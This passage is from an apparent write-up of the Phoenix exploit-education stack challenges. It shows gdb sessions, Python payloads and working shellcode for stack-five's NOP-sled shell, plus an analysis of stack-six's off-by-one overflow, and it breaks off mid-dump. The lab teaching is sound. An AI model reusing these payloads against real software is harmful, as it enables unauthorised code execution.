  400667:       90                      nop
  400668:       c9                      leaveq 
  400669:       c3                      retq   

000000000040066a <main>:
  40066a:       55                      push   %rbp
  40066b:       48 89 e5                mov    %rsp,%rbp
  40066e:       48 83 ec 10             sub    $0x10,%rsp
  400672:       89 7d fc                mov    %edi,-0x4(%rbp)
  400675:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
  400679:       bf 50 07 40 00          mov    $0x400750,%edi
  40067e:       e8 fd fd ff ff          callq  400480 <puts@plt>
  400683:       b8 00 00 00 00          mov    $0x0,%eax
  400688:       e8 a8 ff ff ff          callq  400635 <start_level>
  40068d:       b8 00 00 00 00          mov    $0x0,%eax
  400692:       c9                      leaveq 
  400693:       c3                      retq   
  400694:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40069b:       00 00 00 
  40069e:       66 90                   xchg   %ax,%ax

00000000004006a0 <__do_global_ctors_aux>:
  4006a0:       48 8b 05 c9 01 20 00    mov    0x2001c9(%rip),%rax        # 600870 <__CTOR_LIST__>
  4006a7:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  4006ab:       74 33                   je     4006e0 <__do_global_ctors_aux+0x40>
  4006ad:       55                      push   %rbp
  4006ae:       48 89 e5                mov    %rsp,%rbp
  4006b1:       53                      push   %rbx
  4006b2:       bb 70 08 60 00          mov    $0x600870,%ebx
  4006b7:       48 83 ec 08             sub    $0x8,%rsp
  4006bb:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  4006c0:       48 83 eb 08             sub    $0x8,%rbx
  4006c4:       ff d0                   callq  *%rax
  4006c6:       48 8b 03                mov    (%rbx),%rax
  4006c9:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  4006cd:       75 f1                   jne    4006c0 <__do_global_ctors_aux+0x20>
  4006cf:       48 83 c4 08             add    $0x8,%rsp
  4006d3:       5b                      pop    %rbx
  4006d4:       5d                      pop    %rbp
  4006d5:       c3                      retq   
  4006d6:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4006dd:       00 00 00 
  4006e0:       f3 c3                   repz retq 

Disassembly of section .fini:

00000000004006e2 <_fini>:
  4006e2:       50                      push   %rax
  4006e3:       e8 78 fe ff ff          callq  400560 <__do_global_dtors_aux>
  4006e8:       58                      pop    %rax
  4006e9:       c3                      retq   
```
 
Objdumping the program gets us 0x40061d for the location of the complete_level function. Adding the hexcode \x1d\x06\x40 in the place where VWWWWXXX was in the input we did solves the challenge. 
 
```bash
user@phoenix-amd64:~$ python -c "print('AAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVV' + '\x1d\x06\x40')" | /opt/phoenix/amd64/stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

## Challenge 6 - Stack Five

[Stack Five Code](https://exploit.education/phoenix/stack-five/). 

This challenge is like the last challenge except there is no function we need to call to complete it. This requires us to make our own function to run using shell code. The buffer variable's size is now 160 bytes so we will need to input more than that into the user input. We’ll start by making a python script that is from A-Z, but expanded so that it fills the whole 160 bytes of the buffer. 

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSSTTTTTTTUUUUUUUUVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYZZZZZZZ"
print(padding)
```

Before running gdb we will need redirect our python script’s output to a temporary file. This way we can use that file for our user input. Now we will use gdb to create a breakpoint in the start_level function where that function calling return. We use the gdb command disas or disassemble to disassemble the start_level function. Then we set a breakpoint at the return call by using the command break and giving it the hex code of the return call’s location. Now we run the program while also redirecting the file from earlier to be used as the user input. Our breakpoint will get hit, then we need to step through the code once. If we now check the instruction pointer or rip. It will be pointing to address location 0x5555555454545454 or UUUTTTTT. We know now that the buffer is overflowing, and that it is overwriting the instruction pointer. Which means we can point this return to any code we want. Since in this challenge there isn’t a function we need to call by having the rip point to, we need to make our own. But first we need to test if we can get our own code to run by inserting CC hexcode on to the stack and having rip point to it. What CC should do is call the built in cpu interrupt and interrupt the code for us exactly like a breakpoint. This will tell us that out exploit is working. To get the location on the stack we need the CC’s to be. We can look at where we have overwritten it with our input. Using x/64s on the rsp or stack pointer we can see that we overwritten the stack at location 0x7FFFFFFFe670. That’s where we want rip to point to and the CC’s to be located.

```bash
user@phoenix-amd64:~$ python stack-five.py > /tmp/alpha
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-five 
(gdb) disas start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:     push   rbp
   0x000000000040058e <+1>:     mov    rbp,rsp
   0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:    mov    rdi,rax
   0x000000000040059c <+15>:    call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:    nop
   0x00000000004005a2 <+21>:    leave  
   0x00000000004005a3 <+22>:    ret    
End of assembler dump.
(gdb) break *0x4005a3
Breakpoint 1 at 0x4005a3
(gdb) r < /tmp/alpha 
Starting program: /opt/phoenix/amd64/stack-five < /tmp/alpha
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a3 in start_level ()
(gdb) si
0x5555555454545454 in ?? ()
(gdb) x/s $rip
0x5555555454545454:     <error: Cannot access memory at address 0x5555555454545454>
(gdb) x/64s $rsp
0x7fffffffe670: "UUUUUUVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYZZZZZZZ"
0x7fffffffe69c: ""
0x7fffffffe69d: "\177"
0x7fffffffe69f: ""
0x7fffffffe6a0: ""
0x7fffffffe6a1: ""
0x7fffffffe6a2: ""
0x7fffffffe6a3: ""
0x7fffffffe6a4: ""
0x7fffffffe6a5: ""
0x7fffffffe6a6: ""
0x7fffffffe6a7: ""
0x7fffffffe6a8: "\310\333\377\367\377\177"
0x7fffffffe6af: ""
0x7fffffffe6b0: ""
0x7fffffffe6b1: ">"
0x7fffffffe6b3: ""
0x7fffffffe6b4: "\001"
0x7fffffffe6b6: ""
0x7fffffffe6b7: "\004Y\004@"
0x7fffffffe6bc: ""
0x7fffffffe6bd: ""
0x7fffffffe6be: ""
0x7fffffffe6bf: ""
0x7fffffffe6c0: ""
0x7fffffffe6c1: ""
0x7fffffffe6c2: ""
0x7fffffffe6c3: ""
0x7fffffffe6c4: ""
0x7fffffffe6c5: ""
0x7fffffffe6c6: ""
0x7fffffffe6c7: ""
0x7fffffffe6c8: "6\004@"
0x7fffffffe6cc: ""
0x7fffffffe6cd: ""
0x7fffffffe6ce: ""
0x7fffffffe6cf: ""
0x7fffffffe6d0: "\001"
0x7fffffffe6d2: ""
0x7fffffffe6d3: ""
0x7fffffffe6d4: ""
0x7fffffffe6d5: ""
0x7fffffffe6d6: ""
0x7fffffffe6d7: ""
0x7fffffffe6d8: "\307\350\377\377\377\177"
0x7fffffffe6df: ""
0x7fffffffe6e0: ""
0x7fffffffe6e1: ""
0x7fffffffe6e2: ""
0x7fffffffe6e3: ""
0x7fffffffe6e4: ""
0x7fffffffe6e5: ""
0x7fffffffe6e6: ""
0x7fffffffe6e7: ""
0x7fffffffe6e8: "\345\350\377\377\377\177"
0x7fffffffe6ef: ""
0x7fffffffe6f0: "\241\356\377\377\377\177"
0x7fffffffe6f7: ""
0x7fffffffe6f8: "\314\356\377\377\377\177"
0x7fffffffe6ff: ""
0x7fffffffe700: "\341\356\377\377\377\177"
0x7fffffffe707: ""
0x7fffffffe708: "\353\356\377\377\377\177"
0x7fffffffe70f: ""
```
Our python script can be modified to allow us to get the rip to point to stack location 0x7FFFFFFFe670 and have CC’s at that location. We can run a separate terminal instance and modify the python script to insert hexcode \x70\xe6\xff\xff\xff\x7f\x00\x00 after the first T in out alphabet string. We know to insert it there, because when we looked at the instruction pointer after the return call it was pointing to UUUTTTTT. We know that rip gets overwritten there, so we can insert the location on the stack there. There reason will the stack location is backwards is to account for endianness . After the stack location we can insert a few CC hexcodes, so we can test if our own code can run. We then run the python script and overwrite the temporary file with the new one we created. 

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSST"
rip = b'\x70\xe6\xff\xff\xff\x7f\x00\x00'
shell = b'\xCC'*8
print(padding+rip+shell)
```
Now if we rerun the program on gdb and continue it after hitting the breakpoint. The program will hit a SIGTRAP signal at the address location 0x00007FFFFFFFe671, which is our CC hexcodes being hit. This means we can run own our code of whatever we want. But before getting we get to that part if we quit gdb and try to run the program with our python script as the user input. We get Segmentation Fault. Why? The reason we get this, is because the location we told the instruction pointer to go to. The CC’s aren’t there. The got moved around on the stack because every different time the code is ran the stack can be offset a tiny bit by very small things like the directory location the user call the program from. 

```bash
(gdb) r < /tmp/alpha 
Starting program: /opt/phoenix/amd64/stack-five < /tmp/alpha
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a3 in start_level ()
(gdb) si
0x00007fffffffe670 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe671 in ?? ()
(gdb) quit
user@phoenix-amd64:~$ python stack-five.py | /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
```
To fix this we can stuff the stack with the hexcodes 90. This is called the NOP opcode which when the instruction pointer hits it no code is ran. This allows us to make a buffer in the stack with a ton of NOP instructions, so we are bound to hit one. Once one is it the instruction pointer can slide down the NOPs and then hit our shellcode  or machine code designed to be used in exploiting overwritten instruction pointers. It is best to use already made shellcode like from [here](http://shell-storm.org). We just need shellcode that is for the right architecture for our machine. We need Linux x86-64 architecture shell code. The code I picked is [this](http://shell-storm.org/shellcode/files/shellcode-806.php). Now we can recreate our python script to point the rip to a random stack address after the one we found earlier. Then pad the stack with a top of NOP instructions so we can hit one of them instead of a precise location of our shellcode. Now lastly we will add the shellcode that will allow us to have a command shell inside the program.  


### Solved

```python
padding = "AAAAAAABBBBBBBCCCCCCCDDDDDDDEEEEEEEFFFFFFFGGGGGGGHHHHHHHIIIIIIIJJJJJJJKKKKKKKLLLLLLLMMMMMMMMNNNNNNNOOOOOOOPPPPPPPQQQQQQQQRRRRRRRSSSSSSST"
rip = b'\x90\xe6\xff\xff\xff\x7f\x00\x00'
nop = b'\x90'*100
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print(padding+rip+nop+shell)
```
Now we just pipe the output into the programs user input and get a command shell. But, we need to use “; cat” when piping the python scripts output. Cat by itself redirects input to output allowing use to give our shell any input we want. Running whoami command shows us that we are the program and that we have exploited the program’s buffer overflow.

```bash
user@phoenix-amd64:~$ (python stack-five.py ; cat) | /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
whoami
phoenix-amd64-stack-five

```
## Challenge 7 - Stack Six

[Stack Six Code](https://exploit.education/phoenix/stack-six/). 

This challenge can be quiet tricky. By looking at the code it isn't obvious what the problem is. The first place to start is looking at the greet function.

```c++
char *greet(char *who) {
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize > (sizeof(buffer) - /* ensure null termination */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
```

It is only after really digging through and thinking about how the code is running I noticed the bug. The program try's to limit the user input to only 127 bytes which is good, but when it is copying those characters onto the buffer it overflows. The program doesn't take into count that there is already characters in the buffer and the length of those characters should be subtracted from the maxSize variable. This causes a buffer overflow but not by much depending on how big the what variable is.

```c++
strncpy(buffer + strlen(buffer), who, maxSize);
```

To figure out how much we overflow the buffer we can create a python script that just prints out 127 As.

```python
padding = "A" * 127
print(padding)
```
We then put the output of that script into the ExploitEducation environment variable then run the program in gdb. We disassemble the greet function and put break points before and after the input contents are copied onto the buffer, so we can see the overflow. After the first breakpoint we check the registers and everything seems fine. We can continue to the next. At the next breakpoint when checking the registers you may notice that rbp has a 41 in it and that wasn't there before. Rpb is the base pointer it was pointing to the the stack address that main will return to. Meaning A, it shouldn't be changed especially with a hexcode for A. B, it can allow us to change where the main function returns to.

```bash
user@phoenix-amd64:~$ export ExploitEducation=$(python stack-six.py)
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-six 
(gdb) disas greet
Dump of assembler code for function greet:
   0x00000000004006fd <+0>:     push   rbp
   0x00000000004006fe <+1>:     mov    rbp,rsp
   0x0000000000400701 <+4>:     push   rbx
   0x0000000000400702 <+5>:     sub    rsp,0xa8
   0x0000000000400709 <+12>:    mov    QWORD PTR [rbp-0xa8],rdi
   0x0000000000400710 <+19>:    mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400717 <+26>:    mov    rdi,rax
   0x000000000040071a <+29>:    call   0x400580 <strlen@plt>
   0x000000000040071f <+34>:    mov    DWORD PTR [rbp-0x14],eax
   0x0000000000400722 <+37>:    mov    eax,DWORD PTR [rbp-0x14]
   0x0000000000400725 <+40>:    cmp    eax,0x7f
   0x0000000000400728 <+43>:    jbe    0x400731 <greet+52>
   0x000000000040072a <+45>:    mov    DWORD PTR [rbp-0x14],0x7f
   0x0000000000400731 <+52>:    mov    rdx,QWORD PTR [rip+0x200458]        # 0x600b90 <what>
   0x0000000000400738 <+59>:    lea    rax,[rbp-0xa0]
   0x000000000040073f <+66>:    mov    rsi,rdx
   0x0000000000400742 <+69>:    mov    rdi,rax
   0x0000000000400745 <+72>:    call   0x400510 <strcpy@plt>
   0x000000000040074a <+77>:    mov    eax,DWORD PTR [rbp-0x14]
   0x000000000040074d <+80>:    movsxd rbx,eax
   0x0000000000400750 <+83>:    lea    rax,[rbp-0xa0]
   0x0000000000400757 <+90>:    mov    rdi,rax
   0x000000000040075a <+93>:    call   0x400580 <strlen@plt>
   0x000000000040075f <+98>:    mov    rdx,rax
   0x0000000000400762 <+101>:   lea    rax,[rbp-0xa0]
   0x0000000000400769 <+108>:   lea    rcx,[rax+rdx*1]
   0x000000000040076d <+112>:   mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000400774 <+119>:   mov    rdx,rbx
   0x0000000000400777 <+122>:   mov    rsi,rax
   0x000000000040077a <+125>:   mov    rdi,rcx
   0x000000000040077d <+128>:   call   0x400550 <strncpy@plt>
   0x0000000000400782 <+133>:   lea    rax,[rbp-0xa0]
   0x0000000000400789 <+140>:   mov    rdi,rax
   0x000000000040078c <+143>:   call   0x400560 <strdup@plt>
   0x0000000000400791 <+148>:   add    rsp,0xa8
   0x0000000000400798 <+155>:   pop    rbx
   0x0000000000400799 <+156>:   pop    rbp
   0x000000000040079a <+157>:   ret    
End of assembler dump.
(gdb) break *0x40077a
Breakpoint 1 at 0x40077a
(gdb) break *0x40079a
Breakpoint 2 at 0x40079a
(gdb) r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040077a in greet ()
(gdb) info reg
rax            0x7fffffffef0f      0x7fffffffef0f
rbx            0x7f                0x7f
rcx            0x7fffffffe562      0x7fffffffe562
rdx            0x7f                0x7f
rsi            0x7fffffffef0f      0x7fffffffef0f
rdi            0x7fffffffe562      0x7fffffffe562
rbp            0x7fffffffe5e0      0x7fffffffe5e0
rsp            0x7fffffffe530      0x7fffffffe530
r8             0x7fffffffe540      0x7fffffffe540
r9             0xfefefefefefefeff  0xfefefefefefefeff
r10            0x0                 0x0
r11            0x202               0x202
r12            0x7fffffffe678      0x7fffffffe678
r13            0x40079b            0x40079b
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x40077a            0x40077a <greet+125>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
(gdb) c
Continuing.

Breakpoint 2, 0x000000000040079a in greet ()
(gdb) info reg
rax            0x600c00            0x600c00
rbx            0x4141414141414141  0x4141414141414141
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x7fffffffe5e7      0x7fffffffe5e7
rdi            0x600ca7            0x600ca7
rbp            0x7fffffffe641      0x7fffffffe641
rsp            0x7fffffffe5e8      0x7fffffffe5e8
r8             0x1f                0x1f
r9             0xfefefefefefefeff  0xfefefefefefefeff
r10            0x0                 0x0
r11            0x202               0x202
r12            0x7fffffffe678      0x7fffffffe678
r13            0x40079b            0x40079b
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x40079a            0x40079a <greet+157>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0

```

First I made a new script to test if it wasn't a fluke that rbp was changed to 41 at the last byte.

```python
padding = "A" * 126 + "Z"
print(padding)
```
Running the script and checking the rbp value again confirms that we are overwriting the rbp value. How can we know exploit this and where can we jump to. Since we can only change 1 byte we are very limited to where we can jump to. 0x7fffffffe600 - 0x7fffffffe6ff is the only area in the code we can look for a jumping point. Creating a breakpoint at the return call in main we can check whats in the addresses of 0x7fffffffe600 - 0x7fffffffe6ff. We can see quiet a few places we can jump to, but how do we know whats a place we can put data in. Now if we dump all of the stack pointer we can look for places on the stack we can manipulate. We can see that the ExploitEducation variable is at 0x7fffffffeeff, so any where between that and 0x7fffffffef90 is a great place to jump because we control it. We can see that back on the stack at 0x7fffffffe608 is 0x00007fffffffef10, which is perfect for what we want. I am gonna start by saying this is where I got stumped. In order for the instruction pointer we need to have rbp set to 0x7fffffffe600. The problem is python will not print a 0x00 character because it is a null byte. I really had to think of a way around this.

```bash
user@phoenix-amd64:~$ export ExploitEducation=$(python stack-six.py)
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-six 
(gdb) break *0x40079a
Breakpoint 1 at 0x40079a
(gdb) r
Starting program: /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040079a in greet ()

(gdb) info reg
rax            0x600c00            0x600c00
rbx            0x4141414141414141  0x4141414141414141
rcx            0x0                 0x0
rdx            0x0                 0x0
rsi            0x7fffffffe5e7      0x7fffffffe5e7
rdi            0x600ca7            0x600ca7
rbp            0x7fffffffe65a      0x7fffffffe65a
rsp            0x7fffffffe5e8      0x7fffffffe5e8
r8             0x1f                0x1f
r9             0xfefefefefefefeff  0xfefefefefefefeff
r10            0x0                 0x0
r11            0x202               0x202
r12            0x7fffffffe678      0x7fffffffe678
r13            0x40079b            0x40079b
r14            0x0                 0x0
r15            0x0                 0x0
rip            0x40079a            0x40079a <greet+157>
eflags         0x206               [ PF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
(gdb) disas main
Dump of assembler code for function main:
   0x000000000040079b <+0>:     push   rbp
   0x000000000040079c <+1>:     mov    rbp,rsp
   0x000000000040079f <+4>:     sub    rsp,0x20
   0x00000000004007a3 <+8>:     mov    DWORD PTR [rbp-0x14],edi
   0x00000000004007a6 <+11>:    mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004007aa <+15>:    mov    edi,0x400878
   0x00000000004007af <+20>:    call   0x400530 <puts@plt>
   0x00000000004007b4 <+25>:    mov    edi,0x4008c2
   0x00000000004007b9 <+30>:    call   0x400520 <getenv@plt>
   0x00000000004007be <+35>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007c2 <+39>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004007c7 <+44>:    jne    0x4007dd <main+66>
   0x00000000004007c9 <+46>:    mov    esi,0x4008d8
   0x00000000004007ce <+51>:    mov    edi,0x1
   0x00000000004007d3 <+56>:    mov    eax,0x0
   0x00000000004007d8 <+61>:    call   0x400540 <errx@plt>
   0x00000000004007dd <+66>:    mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e1 <+70>:    mov    rdi,rax
   0x00000000004007e4 <+73>:    call   0x4006fd <greet>
   0x00000000004007e9 <+78>:    mov    rdi,rax
   0x00000000004007ec <+81>:    call   0x400530 <puts@plt>
   0x00000000004007f1 <+86>:    mov    eax,0x0
   0x00000000004007f6 <+91>:    leave  
   0x00000000004007f7 <+92>:    ret    
End of assembler dump.
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 
(gdb) break *0x4007f7
Breakpoint 2 at 0x4007f7
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 
(gdb) c
Continuing.
Welcome, I am pleased to meet you AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ����

Breakpoint 2, 0x00000000004007f7 in main ()
(gdb) x/32xg 0x7fffffffe600
0x7fffffffe600: 0x000000000040079b      0x00007fffffffef10
0x7fffffffe610: 0x0000000000000001      0x00007ffff7d8fd62
0x7fffffffe620: 0x0000000000000000      0x00007fffffffe660
0x7fffffffe630: 0x0000000000000000      0x00007ffff7ffdbc8
0x7fffffffe640: 0x0400000100003e00      0x00000000004005c9
0x7fffffffe650: 0x0000000000000000      0x00000000004005a6
0x7fffffffe660: 0x0000000000000001      0x00007fffffffe843
0x7fffffffe670: 0x0000000000000000      0x00007fffffffe860
0x7fffffffe680: 0x00007fffffffee1c      0x00007fffffffee47
0x7fffffffe690: 0x00007fffffffee66      0x00007fffffffee70
0x7fffffffe6a0: 0x00007fffffffee7f      0x00007fffffffee8f
0x7fffffffe6b0: 0x00007fffffffeeac      0x00007fffffffeebf
0x7fffffffe6c0: 0x00007fffffffeed3      0x00007fffffffeee3
0x7fffffffe6d0: 0x00007fffffffeef7      0x00007fffffffeeff
0x7fffffffe6e0: 0x00007fffffffef90      0x00007fffffffef9d
0x7fffffffe6f0: 0x0000000000000000      0x0000000000000021
(gdb) x/1000s $rsp
0x7fffffffe662: ""
...
0x7fffffffe843: "/opt/phoenix/amd64/stack-six"
0x7fffffffe860: "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
0x7fffffffee1c: "SSH_CONNECTION=10.0.2.2 59496 10.0.2.15 22"
0x7fffffffee47: "_=/opt/phoenix/amd64/stack-six"
0x7fffffffee66: "USER=user"
0x7fffffffee70: "PWD=/home/user"
0x7fffffffee7f: "HOME=/home/user"
0x7fffffffee8f: "SSH_CLIENT=10.0.2.2 59496 22"
0x7fffffffeeac: "SSH_TTY=/dev/pts/1"
0x7fffffffeebf: "MAIL=/var/mail/user"
0x7fffffffeed3: "SHELL=/bin/bash"
0x7fffffffeee3: "TERM=xterm-256color"
0x7fffffffeef7: "SHLVL=1"
0x7fffffffeeff: "ExploitEducation=", 'A' <repeats 126 times>, "Z"
0x7fffffffef90: "LOGNAME=user"
0x7fffffffef9d: "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
0x7fffffffefdb: "/opt/phoenix/amd64/stack-six"
...
0x7ffffffff000: <error: Cannot access memory at address 0x7ffffffff000>
```

So after thinking about the problem at hand for a bit my decision was to run the program from a different folder. I made of folders and ran gdb again to check the stack addresses for everything again. ExploitEducation is at 0x7fffffffef00 and rbp needs to be in the 0x7fffffffe500-0x7fffffffe5ff range. This time the address I need is 0x7fffffffe5c8, so I need python to only print out 0xc0 which is a lot more doable. I then created a script that has a bunch of NOPs and a shellcode that gives me a command shell inside the program. The last character in the python script's output is 0xc0. That way after main's return call it the program will jump to 0x00007fffffffef10 and be executing code somewhere in our environment variable.

```bash
(gdb) x/1000s $rsp
0x7fffffffe5b0: "(\346\377\377\377\177"
...
0x7fffffffe81b: "/opt/phoenix/amd64/stack-six"
0x7fffffffe838: "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:"
0x7fffffffedf4: "SSH_CONNECTION=10.0.2.2 59494 10.0.2.15 22"
0x7fffffffee1f: "_=/opt/phoenix/amd64/stack-six"
0x7fffffffee3e: "OLDPWD=/home/user/new/new2"
0x7fffffffee59: "USER=user"
0x7fffffffee63: "PWD=/home/user/new/new2/new3"
0x7fffffffee80: "HOME=/home/user"
0x7fffffffee90: "SSH_CLIENT=10.0.2.2 59494 22"
0x7fffffffeead: "SSH_TTY=/dev/pts/0"
0x7fffffffeec0: "MAIL=/var/mail/user"
0x7fffffffeed4: "SHELL=/bin/bash"
0x7fffffffeee4: "TERM=xterm-256color"
0x7fffffffeef8: "SHLVL=1"
